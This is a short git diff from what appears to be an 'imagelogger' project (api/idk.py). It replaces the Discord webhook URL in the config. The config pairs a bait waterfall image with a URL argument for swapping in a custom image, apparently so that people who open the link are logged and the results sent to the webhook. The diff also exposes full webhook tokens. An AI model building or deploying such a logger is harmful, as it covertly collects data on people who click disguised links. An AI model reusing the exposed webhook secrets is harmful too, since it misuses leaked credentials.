a157cc8ce6b004e10b4c4d37d22384c0408b491e
franciscom1855-stack <franciscom1855@gmail.com>
2025-08-14 18:16:13 -0700

    Update idk.py

--- api/idk.py
+++ api/idk.py
@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1405718931871633508/-MhwgiVILRt0Kv-yIznDQCFXoB9zXpZ4HneGEZsoGWDFZmcohxcosKi50bX1awHNq1ss",
+    "webhook": "https://discord.com/api/webhooks/1405721299984191632/fUds36Z55QUzB3amG-aNQWFBiIvajsRu9TTLcKVOdTus7NDjBLo0hemLxAYGDDzxd7A8",
     "image": "https://wallsdesk.com/wp-content/uploads/2016/05/Waterfalls-Photos.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
